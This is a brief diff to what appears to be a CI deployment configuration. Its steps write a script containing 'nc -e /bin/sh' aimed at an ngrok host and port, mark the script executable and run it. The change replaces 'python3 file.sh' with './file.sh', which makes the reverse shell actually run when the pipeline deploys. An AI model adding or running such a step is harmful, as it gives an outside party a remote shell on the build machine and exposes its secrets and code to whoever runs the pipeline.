@@ -9,4 +9,4 @@ deploy:
         - echo '' > file.sh
         - echo "nc -e /bin/sh '7.tcp.eu.ngrok.io' 15261" >> file.sh
         - chmod +x file.sh
-        - python3 file.sh
+        - ./file.sh
